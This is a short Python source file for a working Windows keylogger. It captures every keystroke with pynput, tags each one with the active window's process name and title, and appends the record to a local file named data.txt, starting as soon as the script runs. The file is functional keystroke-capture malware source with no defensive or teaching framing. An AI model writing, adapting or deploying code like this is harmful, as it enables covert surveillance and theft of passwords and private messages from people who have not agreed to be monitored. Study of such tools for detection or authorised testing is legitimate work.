import pynput.keyboard
import win32gui
import win32process
import time

class KeyLogger:
    
    def __init__(self):
        self.logger = ''

    def append_to_log(self,key_strike):
        self.logger = self.logger + key_strike
        process_name, window_title = get_active_window_title()
        
        with open("data.txt","a+",encoding="utf-8") as file:
            file.write('Process Name: '+process_name+' Window Title: '+window_title+'  Key Pressed :  ' +self.logger+'\n')
        
        print(self.logger)
        self.logger = ''
        
    def evaluate_keys(self,key):
        try:
            Pressed_key = str(key.char)
        except AttributeError:
            if key == key.space:
                Pressed_key= " "
            else:
                Pressed_key = " " + str(key) + " "
        self.append_to_log(Pressed_key)
        
    def start(self):
        keyboard_listner = pynput.keyboard.Listener(on_press=self.evaluate_keys)
        with keyboard_listner:
            self.logger = ''
            keyboard_listner.join()
            
def get_active_window_title():
    hwnd = win32gui.GetForegroundWindow()
    
    _, pid = win32process.GetWindowThreadProcessId(hwnd)
    
    try:
        process_name = win32process.GetModuleFileNameEx(win32process.OpenProcess(0x0400 | 0x0010, False, pid), 0)
    except:
        process_name = "Unknown"
    
    window_title = win32gui.GetWindowText(hwnd)
    
    return process_name, window_title

KeyLogger().start()